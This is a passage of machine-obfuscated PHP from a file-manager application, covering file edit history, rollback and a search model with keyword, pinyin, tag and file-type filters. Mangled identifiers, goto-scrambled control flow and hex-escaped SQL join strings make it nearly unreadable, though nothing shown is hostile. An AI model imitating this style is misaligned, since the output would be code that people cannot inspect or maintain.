$GLOBALS[$eˆ‚äÁ÷•¿[6]][$eˆ‚äÁ÷•¿[84]][$eˆ‚äÁ÷•¿[2274]]; if ($FÔÀÕ®ğ‚… > 1) { $this->historyAutoClear($fÁâ‘ˆ¬ŒŸ[$eˆ‚äÁ÷•¿[365]]); $this->add($fÁâ‘ˆ¬ŒŸ); } Model($eˆ‚äÁ÷•¿[2275])->eventFileEdit($A§„œØ†‚[$eˆ‚äÁ÷•¿[365]]); } private function historyAutoClear($A®Û‘®èÅƒ) { goto cêô–¢Æº¬; fè¤£ï¯ŸÏ: $cË±Êòˆª = array($aÍ…·ôÁ¥[381] => array($aÍ…·ôÁ¥[7], $c¦›Ô¬¾±Â)); $this->where($cË±Êòˆª)->delete(); Model($aÍ…·ôÁ¥[418])->remove($f¢“ÎƒÃ±); goto e´ô×²’¤¨; E¾ç“ŞéÃ…: if ($EŒ‹“Š‹ÌŒ >= 500) { return; } $cË±Êòˆª = array($aÍ…·ôÁ¥[379] => $A®Û‘®èÅƒ); $e½™¦±Çİ = $this->field($aÍ…·ôÁ¥[2278])->where($cË±Êòˆª)->order($aÍ…·ôÁ¥[2270])->select(); goto aŒÌÈ£…³×; aòçÂëÔØˆ: $f¢“ÎƒÃ± = array_to_keyvalue($e½™¦±Çİ, $aÍ…·ôÁ¥[33], $aÍ…·ôÁ¥[415]); $f¢“ÎƒÃ± = array_slice($f¢“ÎƒÃ±, $EŒ‹“Š‹ÌŒ); if (!$c¦›Ô¬¾±Â || !$f¢“ÎƒÃ±) { return; } goto fè¤£ï¯ŸÏ; cêô–¢Æº¬: $aÍ…·ôÁ¥ =& $_SERVER[Ö¹ñÒÁ²÷]; $d‰½åĞ ¨ = Model($aÍ…·ôÁ¥[1082])->get($aÍ…·ôÁ¥[2276]); $B¨ğÁ™Ä½å = $GLOBALS[$aÍ…·ôÁ¥[6]][$aÍ…·ôÁ¥[84]][$aÍ…·ôÁ¥[2274]]; goto fÇ”…³ç¯; aŒÌÈ£…³×: if (!$e½™¦±Çİ || $EŒ‹“Š‹ÌŒ >= count($e½™¦±Çİ)) { return; } $c¦›Ô¬¾±Â = array_to_keyvalue($e½™¦±Çİ, $aÍ…·ôÁ¥[33], $aÍ…·ôÁ¥[363]); $c¦›Ô¬¾±Â = array_slice($c¦›Ô¬¾±Â, $EŒ‹“Š‹ÌŒ); goto aòçÂëÔØˆ; fÇ”…³ç¯: $Fµ‡š– = $d‰½åĞ ¨ == $aÍ…·ôÁ¥[2277] ? 3 : $B¨ğÁ™Ä½å; if ($B¨ğÁ™Ä½å <= 1) { $Fµ‡š– = 1; } $EŒ‹“Š‹ÌŒ = $Fµ‡š– - 1; goto E¾ç“ŞéÃ…; e´ô×²’¤¨: } public function listData($BøÄ¬ì…„) { goto FÏÎœóßÂÄ; FÏÎœóßÂÄ: $A‚õï¹»ãä =& $_SERVER[Ö¹ñÒÁ²÷]; $cŠ´ºÁ¿¥î = array($A‚õï¹»ãä[379] => $BøÄ¬ì…„); $eå—£‘Íîº = $A‚õï¹»ãä[2279]; goto CƒÕå…¼À¶; CƒÕå…¼À¶: $CÇÃ¤ÈÏ«Í = $this->field($eå—£‘Íîº)->where($cŠ´ºÁ¿¥î)->order($A‚õï¹»ãä[2270])->selectPage(); $this->_listAppendUser($CÇÃ¤ÈÏ«Í[$A‚õï¹»ãä[350]]); $C…†É‹¢¢ = Model($A‚õï¹»ãä[1082])->get($A‚õï¹»ãä[2276]); goto b„òŞÜ‹‡ã; b„òŞÜ‹‡ã: $d óœ¥âÚ = 3; if ($C…†É‹¢¢ == $A‚õï¹»ãä[2277]) { $CÇÃ¤ÈÏ«Í[$A‚õï¹»ãä[350]] = array_slice($CÇÃ¤ÈÏ«Í[$A‚õï¹»ãä[350]], 0, $d óœ¥âÚ); $CÇÃ¤ÈÏ«Í[$A‚õï¹»ãä[347]] = array($A‚õï¹»ãä[2280] => 1, $A‚õï¹»ãä[2281] => 20, $A‚õï¹»ãä[2282] => 1, $A‚õï¹»ãä[2283] => count($CÇÃ¤ÈÏ«Í[$A‚õï¹»ãä[350]])); } return $CÇÃ¤ÈÏ«Í; goto Bµš—¸—¯Å; Bµš—¸—¯Å: } protected function _listAppendUser(&$c—ùç«‚ª±) { $c‰ã“ç»Ùò =& $_SERVER[Ö¹ñÒÁ²÷]; $fğ‚©½ªĞª = array_to_keyvalue($c—ùç«‚ª±, $c‰ã“ç»Ùò[33], $c‰ã“ç»Ùò[1415]); $C¯‘‡œâæÏ = Model($c‰ã“ç»Ùò[473])->userListInfo($fğ‚©½ªĞª); foreach ($c—ùç«‚ª± as &$A™‡ƒš†±¡) { $d¦Áß ç = $A™‡ƒš†±¡[$c‰ã“ç»Ùò[1415]]; $A™‡ƒš†±¡[$c‰ã“ç»Ùò[374]] = $C¯‘‡œâæÏ[$d¦Áß ç] ? $C¯‘‡œâæÏ[$d¦Áß ç] : !1; } } public function fileInfo($B´‚ËÍÚé¤) { $E¤À¨‚…æ =& $_SERVER[Ö¹ñÒÁ²÷]; $Cãº½ÁÃ× = $this->tablePrefix; $fÄ„Â½¶ = "{$Cãº½ÁÃ×}\x69\x6f\137\146\x69\154\x65\40\146\x69\x6c\x65\x73\x20\x6f\x6e\40\x66\151\154\x65\163\x2e\x66\x69\154\x65\x49\104\40\x3d\40\150\x69\163\164\x6f\162\171\56\x66\151\154\145\111\104"; return $this->alias($E¤À¨‚…æ[2284])->where(array($E¤À¨‚…æ[381] => $B´‚ËÍÚé¤))->join($fÄ„Â½¶, $E¤À¨‚…æ[2285])->find(); } public function removeItem($C…ÈÚ¦œÚš) { $E¶¾­ìÕø =& $_SERVER[Ö¹ñÒÁ²÷]; $f•¯œ›øŸ— = array($E¶¾­ìÕø[381] => $C…ÈÚ¦œÚš); $AÕ÷“•´£Ü = $this->where($f•¯œ›øŸ—)->find(); if ($AÕ÷“•´£Ü) { $D®˜¢îô‹« = $this->where($f•¯œ›øŸ—)->delete(); Model($E¶¾­ìÕø[418])->remove($AÕ÷“•´£Ü[$E¶¾­ìÕø[415]]); return $D®˜¢îô‹«; } return !1; } public function removeBySource($dº‰±Çñˆ†) { goto C«×Ô‡œ‰É; C—Ğ´¥›Øù: return !0; goto aœ¾‘ïÙô¶; c¢¶ç³˜ŞÒ: $f‹Ÿ­Œ¦ = array($AöŠ¬ñ²Øµ[379] => array($AöŠ¬ñ²Øµ[7], $dº‰±Çñˆ†)); $Eø†ÎÑÒ¯¤ = $this->field($AöŠ¬ñ²Øµ[416])->where($f‹Ÿ­Œ¦)->select(); if ($Eø†ÎÑÒ¯¤) { $this->where($f‹Ÿ­Œ¦)->delete(); $eËÛ–’Á®æ = array_to_keyvalue($Eø†ÎÑÒ¯¤, $AöŠ¬ñ²Øµ[33], $AöŠ¬ñ²Øµ[415]); Model($AöŠ¬ñ²Øµ[418])->remove($eËÛ–’Á®æ); } goto C—Ğ´¥›Øù; C«×Ô‡œ‰É: $AöŠ¬ñ²Øµ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$dº‰±Çñˆ†) { return !1; } if (!is_array($dº‰±Çñˆ†)) { $dº‰±Çñˆ† = array($dº‰±Çñˆ†); } goto c¢¶ç³˜ŞÒ; aœ¾‘ïÙô¶: } public function setDetail($c’•ôÙ²ï, $Dî¤ÛÎ“) { $E½¢éÜŞ‹Ñ =& $_SERVER[Ö¹ñÒÁ²÷]; return $this->where(array($E½¢éÜŞ‹Ñ[381] => $c’•ôÙ²ï))->save(array($E½¢éÜŞ‹Ñ[2273] => $Dî¤ÛÎ“)); } public function rollbackToItem($d’¯¢Ü£Œâ, $EÃ„¸æ¯À) { goto aí Í’ÖÕÕ; C˜¬¶ø‚²·: return $this->where(array($f«ÌÚˆ—é[381] => $EÃ„¸æ¯À))->delete(); goto aÎ”ùßÓ––; DÌ¬£ÉÀ¹À: $fÄ¶¬ªÉ— = $this->find($EÃ„¸æ¯À); $Béñ¾²ì˜À = array($f«ÌÚˆ—é[415] => $fÄ¶¬ªÉ—[$f«ÌÚˆ—é[415]], $f«ÌÚˆ—é[77] => $fÄ¶¬ªÉ—[$f«ÌÚˆ—é[77]], $f«ÌÚˆ—é[106] => time(), $f«ÌÚˆ—é[375] => USER_ID); Model($f«ÌÚˆ—é[749])->where(array($f«ÌÚˆ—é[365] => $d’¯¢Ü£Œâ))->save($Béñ¾²ì˜À); goto C˜¬¶ø‚²·; aí Í’ÖÕÕ: $f«ÌÚˆ—é =& $_SERVER[Ö¹ñÒÁ²÷]; $F”Ü¯ÄÛ¥† = Model($f«ÌÚˆ—é[749])->sourceInfo($d’¯¢Ü£Œâ); $this->addHistory($F”Ü¯ÄÛ¥†); goto DÌ¬£ÉÀ¹À; aÎ”ùßÓ––: } public function clearSame($e¨Ñ½™õº‚) { goto aŠÎò•ê; aŠÎò•ê: $eÌÁ»øâ½– =& $_SERVER[Ö¹ñÒÁ²÷]; $dØ¦‡Î˜Éğ = $this->listData($e¨Ñ½™õº‚); $c‹¸ªÂáôš = array_to_keyvalue_group($dØ¦‡Î˜Éğ, $eÌÁ»øâ½–[415]); goto dÈÙÆ®‘›Ê; b‰Ëİõ£Íë: if (!$E¤³–Íò¢) { return; } $this->where(array($eÌÁ»øâ½–[363] => array($eÌÁ»øâ½–[7], $E¤³–Íò¢)))->delete(); Model($eÌÁ»øâ½–[418])->remove($D§ÕƒËæğã); goto fÊ£­ÓšŠ; dÈÙÆ®‘›Ê: $D§ÕƒËæğã = array(); $E¤³–Íò¢ = array(); foreach ($c‹¸ªÂáôš as $F°ÔÆ£®è) { if (!$F°ÔÆ£®è || count($F°ÔÆ£®è) <= 1) { continue; } foreach ($F°ÔÆ£®è as $d–­Ø•¶’) { $D§ÕƒËæğã[] = $d–­Ø•¶’[$eÌÁ»øâ½–[415]]; $E¤³–Íò¢[] = $d–­Ø•¶’[$eÌÁ»øâ½–[363]]; } } goto b‰Ëİõ£Íë; fÊ£­ÓšŠ: } public function userSpace() { $bÁİ£¾Âº =& $_SERVER[Ö¹ñÒÁ²÷]; $D‹¤ò×ÀŒø = $this->tablePrefix; $EØŞ–Õ¹½ö = array($bÁİ£¾Âº[1406] => USER_ID); $CÌË¦‘©Ì = "{$D‹¤ò×ÀŒø}\x69\x6f\x5f\x66\x69\x6c\x65\x20\146\151\154\x65\x73\x20\157\156\x20\146\x69\x6c\x65\163\x2e\146\151\154\x65\x49\x44\40\x3d\x20\x68\151\163\164\157\x72\171\x2e\x66\151\154\x65\x49\x44"; return $this->alias($bÁİ£¾Âº[2284])->where($EØŞ–Õ¹½ö)->join($CÌË¦‘©Ì, $bÁİ£¾Âº[2285])->sum($bÁİ£¾Âº[77]); } } goto aˆµÓ®·Ù; aˆµÓ®·Ù: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($a¯Å»ŸŒ”‹) { goto b‰•Âƒå©ñ; F‚öğµ¼¢: if (!$b·÷õ®°Ÿª[$D¢Ã†²é…»[156]]) { $fÀÉ¢ÅˆçÕ = array_to_keyvalue($Cà”ÜğÄ­à, $D¢Ã†²é…»[33], $D¢Ã†²é…»[156]); $aÌï‰ÖäÖ² = implode($D¢Ã†²é…»[47], $fÀÉ¢ÅˆçÕ); $a™ãñÊ˜ëî = $D¢Ã†²é…»[2236]; } $e­ƒÚíáã = explode($D¢Ã†²é…»[47], trim($aÌï‰ÖäÖ², $D¢Ã†²é…»[47])); return array($a™ãñÊ˜ëî, $e­ƒÚíáã); goto f‚¥ÚµàĞ¹; b‰•Âƒå©ñ: $D¢Ã†²é…» =& $_SERVER[Ö¹ñÒÁ²÷]; $Cà”ÜğÄ­à = KodIO::fileTypeList(); $b·÷õ®°Ÿª = $Cà”ÜğÄ­à[$a¯Å»ŸŒ”‹]; goto fšÉäÏ¿‡«; fšÉäÏ¿‡«: if (!$b·÷õ®°Ÿª) { return array(); } $aÌï‰ÖäÖ² = $b·÷õ®°Ÿª[$D¢Ã†²é…»[156]]; $a™ãñÊ˜ëî = $D¢Ã†²é…»[7]; goto F‚öğµ¼¢; f‚¥ÚµàĞ¹: } public function listPathType($FÚÆÍ±©‘) { $DËÑ´ÌÇš§ =& $_SERVER[Ö¹ñÒÁ²÷]; $E·Õ‚æò¨ = $this->fileTypeWhere($FÚÆÍ±©‘); if (!$E·Õ‚æò¨) { return array(); } $d¡°›Á´¤ = array($DËÑ´ÌÇš§[517] => SourceModel::TYPE_USER, $DËÑ´ÌÇš§[518] => USER_ID, $DËÑ´ÌÇš§[514] => 0, $DËÑ´ÌÇš§[515] => $E·Õ‚æò¨); return $this->listSource($d¡°›Á´¤); } public function listSearch($a…ğ‡Óæ¼, $fò†ƒÈ¼„½ = 300) { goto eã†åìæñ¨; eã†åìæñ¨: $Bø†‹©¶Ø¸ =& $_SERVER[Ö¹ñÒÁ²÷]; if (isset($a…ğ‡Óæ¼[$Bø†‹©¶Ø¸[2156]]) && $a…ğ‡Óæ¼[$Bø†‹©¶Ø¸[2156]]) { $a…ğ‡Óæ¼[$Bø†‹©¶Ø¸[2156]] = str_replace($Bø†‹©¶Ø¸[1568], $Bø†‹©¶Ø¸[2286], trim($a…ğ‡Óæ¼[$Bø†‹©¶Ø¸[2156]])); } $Fšä÷ó¾©Ã = $this->_parseSearchWhere($a…ğ‡Óæ¼); goto F£¯ìõŒ˜; e«íéó¿ôÉ: $this->_listSearchBindPinyin($a…ğ‡Óæ¼, $Fšä÷ó¾©Ã, $Eñ“Š¼µ¢»); $this->alias($Bø†‹©¶Ø¸[483])->_makeOrder()->cache(null, 10); $FÔêÜ¼Àç = $this->distinct(!0)->field($Eñ“Š¼µ¢»)->where($Fšä÷ó¾©Ã)->selectPage($fò†ƒÈ¼„½); goto cñ¢À¿°»å; EºÂ”˜¸­: $this->_listMake($FÔêÜ¼Àç); return $FÔêÜ¼Àç; goto a§Î›ùŠ; cñ¢À¿°»å: $this->_listSearchDesc($FÔêÜ¼Àç, $a…ğ‡Óæ¼, $CÅõææ­ïà); $this->_listSearchTag($FÔêÜ¼Àç, $a…ğ‡Óæ¼, $CÅõææ­ïà); $this->_listDataApply($FÔêÜ¼Àç[$Bø†‹©¶Ø¸[350]]); goto EºÂ”˜¸­; F£¯ìõŒ˜: if (!isset($Fšä÷ó¾©Ã[$Bø†‹©¶Ø¸[393]])) { $Fšä÷ó¾©Ã[$Bø†‹©¶Ø¸[393]] = 0; } $Eñ“Š¼µ¢» = $Bø†‹©¶Ø¸[2287]; $CÅõææ­ïà = $Eñ“Š¼µ¢»; goto e«íéó¿ôÉ; a§Î›ùŠ: } private function _listSearchTag(&$AÙÑ·ÅË¶ö, $CÌ­Ï Ø¶£, $Aåïª’) { goto AÌÓ˜¶†å; AÌÓ˜¶†å: $fâ¤¡ˆÂ» =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$CÌ­Ï Ø¶£[$fâ¤¡ˆÂ»[2156]] || $AÙÑ·ÅË¶ö[$fâ¤¡ˆÂ»[347]][$fâ¤¡ˆÂ»[336]] > 1) { return; } $AÅ­çÄ´Ö• = Model($fâ¤¡ˆÂ»[2288])->listData(); goto bÎ†ÚŞ¬óµ; e²Ñ–ÕÉŠ·: $d´«ÇŞöõé = array_to_keyvalue($d´«ÇŞöõé, $fâ¤¡ˆÂ»[33], $fâ¤¡ˆÂ»[75]); $Eõì­ºéé— = array_unique($d´«ÇŞöõé); $this->_listSearchMerge($AÙÑ·ÅË¶ö, $CÌ­Ï Ø¶£, $Aåïª’, $Eõì­ºéé—); goto BİØµ”¯; bÎ†ÚŞ¬óµ: $AÓ–¶”®±  = array(); $bøõÅç = $CÌ­Ï Ø¶£[$fâ¤¡ˆÂ»[2156]]; foreach ($AÅ­çÄ´Ö• as $féÔ«„ØÛ) { $còê»ª‚Ä = $féÔ«„ØÛ[$fâ¤¡ˆÂ»[28]]; $AÖŒ¥Í¶Ê¯ = str_replace($fâ¤¡ˆÂ»[50], $fâ¤¡ˆÂ»[33], Pinyin::encode($còê»ª‚Ä)); if (stripos($còê»ª‚Ä, $bøõÅç) !== !1 || stripos($AÖŒ¥Í¶Ê¯, $bøõÅç) !== !1) { $AÓ–¶”®± [] = $féÔ«„ØÛ[$fâ¤¡ˆÂ»[363]]; } } goto E¦£‡ŒÁ£‰; E¦£‡ŒÁ£‰: if (!$AÓ–¶”®± ) { return; } $A³¯©¸ğÙÑ = array($fâ¤¡ˆÂ»[389] => array($fâ¤¡ˆÂ»[7], $AÓ–¶”®± )); $d´«ÇŞöõé = Model($fâ¤¡ˆÂ»[390])->field($fâ¤¡ˆÂ»[75])->where($A³¯©¸ğÙÑ)->select(); goto e²Ñ–ÕÉŠ·; BİØµ”¯: } private function _listSearchDesc(&$Dñ¾¹ÁßÂ, $bË“¦Ñ²¹œ, $eìÒÜ´ã‰) { goto E®óÖà•Å…; E®óÖà•Å…: $D…—ª½´ğ• =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$bË“¦Ñ²¹œ[$D…—ª½´ğ•[2156]] || $Dñ¾¹ÁßÂ[$D…—ª½´ğ•[347]][$D…—ª½´ğ•[336]] > 1) { return; } $aî´¬³æ¥¨ = $this->listSearchChildren($bË“¦Ñ²¹œ[$D…—ª½´ğ•[457]]); goto dàÄÅ…æ„Û; f‹»Êã×Û…: $c²çö Ùˆ = Model($D…—ª½´ğ•[500])->field($D…—ª½´ğ•[365])->where($E÷¶ÓËÓ¾Ô)->select(); $cÜ£™®¤Ú = array_to_keyvalue($c²çö Ùˆ, $D…—ª½´ğ•[33], $D…—ª½´ğ•[365]); $this->_listSearchMerge($Dñ¾¹ÁßÂ, $bË“¦Ñ²¹œ, $eìÒÜ´ã‰, $cÜ£™®¤Ú); goto BœŞãã™Ó; dàÄÅ…æ„Û: $aî´¬³æ¥¨ = array_unique($aî´¬³æ¥¨); if (!$aî´¬³æ¥¨) { return; } $E÷¶ÓËÓ¾Ô = array($D…—ª½´ğ•[365] => array($D…—ª½´ğ•[7], $aî´¬³æ¥¨), $D…—ª½´ğ•[89] => $D…—ª½´ğ•[401], $D…—ª½´ğ•[355] => array($D…—ª½´ğ•[748], $D…—ª½´ğ•[2158] . $bË“¦Ñ²¹œ[$D…—ª½´ğ•[2156]] . $D…—ª½´ğ•[2158])); goto f‹»Êã×Û…; BœŞãã™Ó: } private function _listSearchMerge(&$c¾¨ƒç¦Ô, $F‰½ËÌÒõŞ, $EšÌ´Ø‚Ù™, $Dšº…Ó›Á“) { goto Aå¤÷’÷Ó; c¥À˜›„–: $eèÅ½ã†Ïï = $this->field($EšÌ´Ø‚Ù™)->where($C‘ÂÔßÍ¹)->select(); if (!$eèÅ½ã†Ïï) { return; } $Cœ´¾¥Â = array(); goto f ìæƒ±; f ìæƒ±: foreach ($eèÅ½ã†Ïï as $E¸·½à¾Ã) { $D˜ÀÚõÈµé = $eË©¦øÅĞ÷[47] . $F‰½ËÌÒõŞ[$eË©¦øÅĞ÷[457]] . $eË©¦øÅĞ÷[47]; if (stripos($E¸·½à¾Ã[$eË©¦øÅĞ÷[455]], $D˜ÀÚõÈµé) !== !1) { $Cœ´¾¥Â[] = $E¸·½à¾Ã; } } $c¾¨ƒç¦Ô[$eË©¦øÅĞ÷[350]] = array_merge($Cœ´¾¥Â, $c¾¨ƒç¦Ô[$eË©¦øÅĞ÷[350]]); $c¾¨ƒç¦Ô[$eË©¦øÅĞ÷[347]][$eË©¦øÅĞ÷[348]] += count($Cœ´¾¥Â); goto eÖ§ËàÆ‘°; A‚Ñ¹ªªğŞ: $d¿Ğ…âğù  = array_diff($Dšº…Ó›Á“, $b®˜ÆÌˆ†); if (!$d¿Ğ…âğù ) { return; } $C‘ÂÔßÍ¹ = array($eË©¦øÅĞ÷[365] => array($eË©¦øÅĞ÷[7], $d¿Ğ…âğù )); goto c¥À˜›„–; Aå¤÷’÷Ó: $eË©¦øÅĞ÷ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$Dšº…Ó›Á“) { return; } $b®˜ÆÌˆ† = array_to_keyvalue($c¾¨ƒç¦Ô[$eË©¦øÅĞ÷[350]], $eË©¦øÅĞ÷[33], $eË©¦øÅĞ÷[365]); goto A‚Ñ¹ªªğŞ; eÖ§ËàÆ‘°: } public function listSearchChildren($dˆ»œ½Ì§Û, $bæòœ·¡ô = 5000) { goto dã¸òÖ±îê; fÓàˆ“ç¡: $c¬ÈÔ¡âËÚ = array($FÌ‡»ìğÁª[455] => array($FÌ‡»ìğÁª[748], $EÛÉÀØ‹Ù‰[$FÌ‡»ìğÁª[455]] . $EÛÉÀØ‹Ù‰[$FÌ‡»ìğÁª[365]] . $FÌ‡»ìğÁª[480])); $FÅØ¢ª¢˜¿ = $this->field($FÌ‡»ìğÁª[365])->cache(null, 600)->where($c¬ÈÔ¡âËÚ)->count(); if ($FÅØ¢ª¢˜¿ > $bæòœ·¡ô) { return $this->_listSearchChildrenNear($dˆ»œ½Ì§Û, $bæòœ·¡ô); } goto Bš²ÇÎŠ•É; Bš²ÇÎŠ•É: $C­Ã¢›Õ¡– = $this->field($FÌ‡»ìğÁª[365])->where($c¬ÈÔ¡âËÚ)->select(); $d£í·Üõ¢ = array_to_keyvalue($C­Ã¢›Õ¡–, $FÌ‡»ìğÁª[33], $FÌ‡»ìğÁª[365]); return $d£í·Üõ¢; goto fºÇÓ¥Õ¯ˆ; dã¸òÖ±îê: $FÌ‡»ìğÁª =& $_SERVER[Ö¹ñÒÁ²÷]; $d£í·Üõ¢ = array(); $EÛÉÀØ‹Ù‰ = $this->sourceInfo($dˆ»œ½Ì§Û); goto fÓàˆ“ç¡; fºÇÓ¥Õ¯ˆ: } private function _listSearchChildrenNear($DÂÍ¦Ğš±, $CºÁá¡÷‹Š) { goto aôÛÂš·×Ú; cŒ®×æˆÂ°: $F”¸ÈÖ‚õŒ = $this->field($Bºà„‹Â¶[2289])->where($b‰¥àÇªæğ)->select(); $BÍ¼¡£İÏ = array_to_keyvalue(array_filter_by_field($F”¸ÈÖ‚õŒ, $Bºà„‹Â¶[366], $Bºà„‹Â¶[83]), $Bºà„‹Â¶[33], $Bºà„‹Â¶[365]); $cÉÊ”´Ø‚ô = array_merge($cÉÊ”´Ø‚ô, array_to_keyvalue($F”¸ÈÖ‚õŒ, $Bºà„‹Â¶[33], $Bºà„‹Â¶[365])); goto BÈ¡ôË•£Ì; BÈ¡ôË•£Ì: if (!$BÍ¼¡£İÏ) { return $cÉÊ”´Ø‚ô; } $b‰¥àÇªæğ = array($Bºà„‹Â¶[457] => array($Bºà„‹Â¶[7], $BÍ¼¡£İÏ)); $F”¸ÈÖ‚õŒ = $this->field($Bºà„‹Â¶[2289])->where($b‰¥àÇªæğ)->select(); goto B¯¸½¬±à¥; B¯¸½¬±à¥: $cÉÊ”´Ø‚ô = array_merge($cÉÊ”´Ø‚ô, array_to_keyvalue($F”¸ÈÖ‚õŒ, $Bºà„‹Â¶[33], $Bºà„‹Â¶[365])); $cÉÊ”´Ø‚ô = array_slice($cÉÊ”´Ø‚ô, 0, $CºÁá¡÷‹Š); return $cÉÊ”´Ø‚ô; goto d°Å¥‹µº; aôÛÂš·×Ú: $Bºà„‹Â¶ =& $_SERVER[Ö¹ñÒÁ²÷]; $cÉÊ”´Ø‚ô = array(); $b‰¥àÇªæğ = array($Bºà„‹Â¶[457] => $DÂÍ¦Ğš±); goto cŒ®×æˆÂ°; d°Å¥‹µº: } private function _listSearchBindPinyin($B¢èÜ»ºÖ¹, &$c™¶„×ŞÄ, &$E„ö›Ô°Ää) { goto DÔ–å‘¥Š÷; d¬¢¤òÍˆ: $bà£Á²†Ú = array(); $E„ö›Ô°Ää = str_replace(array($a†¨åå‘[213], $a†¨åå‘[50], $a†¨åå‘[2290]), $a†¨åå‘[33], $E„ö›Ô°Ää); $E„ö›Ô°Ää = $a†¨åå‘[2291] . str_replace($a†¨åå‘[47], $a†¨åå‘[2292], $E„ö›Ô°Ää); goto E¿†ÕÌùš‰; eò†²Á¦›Í: $bà£Á²†Ú[] = array($a†¨åå‘[2293] => $bëë‘¾æÈ, $a†¨åå‘[910] => $a†¨åå‘[2160], array($a†¨åå‘[2294] => $bëë‘¾æÈ, $a†¨åå‘[2295] => array($a†¨åå‘[7], array($a†¨åå‘[412], $a†¨åå‘[411])))); $this->join($eÆî¬¯ÎåÀ); $c™¶„×ŞÄ = $bà£Á²†Ú; goto C§åµ¿›æÜ; DÔ–å‘¥Š÷: $a†¨åå‘ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!Input::check($B¢èÜ»ºÖ¹[$a†¨åå‘[2156]], $a†¨åå‘[302]) || strlen($B¢èÜ»ºÖ¹[$a†¨åå‘[2156]]) < 2) { return; } $eÆî¬¯ÎåÀ = "\x4c\x45\x46\x54\x20\112\117\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\x73\157\x75\x72\143\145\137\x6d\x65\164\141\x20\x6d\145\x74\x61\x20\x6f\x6e\40\x73\157\x75\x72\143\145\56\163\157\x75\162\143\x65\x49\104\x20\x3d\x20\155\x65\x74\141\56\x73\x6f\x75\x72\143\145\111\104"; goto d¬¢¤òÍˆ; E¿†ÕÌùš‰: unset($c™¶„×ŞÄ[$a†¨åå‘[28]]); foreach ($c™¶„×ŞÄ as $cÅÛöŠä¼ => $b´ÑÛŠÉÔ©) { $bà£Á²†Ú[$a†¨åå‘[2291] . $cÅÛöŠä¼] = $b´ÑÛŠÉÔ©; } $bëë‘¾æÈ = array($a†¨åå‘[479], $a†¨åå‘[2158] . $B¢èÜ»ºÖ¹[$a†¨åå‘[2156]] . $a†¨åå‘[2158]); goto eò†²Á¦›Í; C§åµ¿›æÜ: } private function _parseSearchWhere($b­Í²ø—í¸) { goto cÏƒÉå„£ì; fãŸ×Å§Ûœ: if (isset($b­Í²ø—í¸[$E²–ñ‘÷†[2156]]) && $b­Í²ø—í¸[$E²–ñ‘÷†[2156]]) { $DôÇß•ßİ = $b­Í²ø—í¸[$E²–ñ‘÷†[2156]]; $f¹›ˆÕÍ“… = explode($E²–ñ‘÷†[50], $DôÇß•ßİ); if (strlen($DôÇß•ßİ) > 2 && (substr($DôÇß•ßİ, 0, 1) == $E²–ñ‘÷†[112] && substr($DôÇß•ßİ, -1) == $E²–ñ‘÷†[112]) || substr($DôÇß•ßİ, 0, 1) == $E²–ñ‘÷†[55] && substr($DôÇß•ßİ, -1) == $E²–ñ‘÷†[55]) { $DôÇß•ßİ = substr($DôÇß•ßİ, 1, -1); $f¹›ˆÕÍ“… = array($DôÇß•ßİ); } $bîàåËÊäã[$E²–ñ‘÷†[28]] = array($E²–ñ‘÷†[479], $E²–ñ‘÷†[2158] . $DôÇß•ßİ . $E²–ñ‘÷†[2158]); if (count($f¹›ˆÕÍ“…) > 1) { $bîàåËÊäã[$E²–ñ‘÷†[28]] = array(); foreach ($f¹›ˆÕÍ“… as $Fµù©’†“ ) { if (!trim($Fµù©’†“ )) { continue; } $bîàåËÊäã[$E²–ñ‘÷†[28]][] = array($E²–ñ‘÷†[479], $E²–ñ‘÷†[2158] . trim($Fµù©’†“ ) . $E²–ñ‘÷†[2158]); } } } return $bîàåËÊäã; goto a‚ù™®Íìí; Aä¾Ã„À”: if (isset($b­Í²ø—í¸[$E²–ñ‘÷†[531]])) { $bîàåËÊäã[] = array($E²–ñ‘÷†[375] => $b­Í²ø—í¸[$E²–ñ‘÷†[531]], $E²–ñ‘÷†[374] => $b­Í²ø—í¸[$E²–ñ‘÷†[531]], $E²–ñ‘÷†[910] => $E²–ñ‘÷†[2160]); } if (isset($b­Í²ø—í¸[$E²–ñ‘÷†[368]])) { $c™Ëæ¹Ö£ = $b­Í²ø—í¸[$E²–ñ‘÷†[368]]; if ($c™Ëæ¹Ö£ == $E²–ñ‘÷†[76]) { $bîàåËÊäã[$E²–ñ‘÷†[366]] = 1; } else { if ($c™Ëæ¹Ö£ == $E²–ñ‘÷†[2301]) { $bîàåËÊäã[$E²–ñ‘÷†[366]] = 0; } else { if ($c™Ëæ¹Ö£) { $c™Ëæ¹Ö£ = is_array($c™Ëæ¹Ö£) ? $c™Ëæ¹Ö£ : explode($E²–ñ‘÷†[47], $c™Ëæ¹Ö£); $bîàåËÊäã[$E²–ñ‘÷†[368]] = array($E²–ñ‘÷†[380], $c™Ëæ¹Ö£); $bîàåËÊäã[$E²–ñ‘÷†[366]] = 0; } } } } if (isset($b­Í²ø—í¸[$E²–ñ‘÷†[457]])) { $c …Ö‹¯’™ = $this->sourceInfo($b­Í²ø—í¸[$E²–ñ‘÷†[457]]); $bîàåËÊäã[$E²–ñ‘÷†[521]] = array($E²–ñ‘÷†[479], $c …Ö‹¯’™[$E²–ñ‘÷†[455]] . $b­Í²ø—í¸[$E²–ñ‘÷†[457]] . $E²–ñ‘÷†[480]); } goto fãŸ×Å§Ûœ; cÏƒÉå„£ì: $E²–ñ‘÷† =& $_SERVER[Ö¹ñÒÁ²÷]; $bîàåËÊäã = array(); if (isset($b­Í²ø—í¸[$E²–ñ‘÷†[699]])) { $bîàåËÊäã[$E²–ñ‘÷†[106]] = array($E²–ñ‘÷†[2296], $b­Í²ø—í¸[$E²–ñ‘÷†[699]]); } goto dŠª½°²ğØ; dŠª½°²ğØ: if (isset($b­Í²ø—í¸[$E²–ñ‘÷†[700]])) { $cÚŸœº¥µ = array($E²–ñ‘÷†[2297], $b­Í²ø—í¸[$E²–ñ‘÷†[700]]); if ($bîàåËÊäã[$E²–ñ‘÷†[106]]) { $bîàåËÊäã[$E²–ñ‘÷†[106]] = array($bîàåËÊäã[$E²–ñ‘÷†[106]], $cÚŸœº¥µ, $E²–ñ‘÷†[2298]); } else { $bîàåËÊäã[$E²–ñ‘÷†[106]] = $cÚŸœº¥µ; } } if (isset($b­Í²ø—í¸[$E²–ñ‘÷†[2299]])) { 